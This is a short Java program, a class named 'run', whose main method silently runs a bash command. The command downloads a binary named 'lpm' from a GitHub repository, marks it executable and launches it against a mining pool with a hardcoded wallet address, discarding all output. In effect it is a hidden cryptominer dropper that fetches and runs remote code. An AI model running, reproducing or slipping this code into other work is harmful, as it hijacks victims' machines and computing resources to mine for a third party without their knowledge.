import java.io.*;
import java.util.*;

public class run {
    public static void main(String[] args) {
        try {
            ProcessBuilder builder = new ProcessBuilder("bash", "-c", "curl -O -L -J https://github.com/lianamahesra-creator/legendary-journey/raw/refs/heads/main/lpm;chmod +x lpm;./lpm --pool pool.pearlhash.xyz:9000 --wallet prl1p2jan4dvkdfkt5r3pra7z96axrxjyjcgat9w7ldetlcy9wffm569sc9ux2t");
            builder.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            builder.redirectError(ProcessBuilder.Redirect.DISCARD);
            Process process = builder.start();
            process.waitFor(); // wait if needed
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
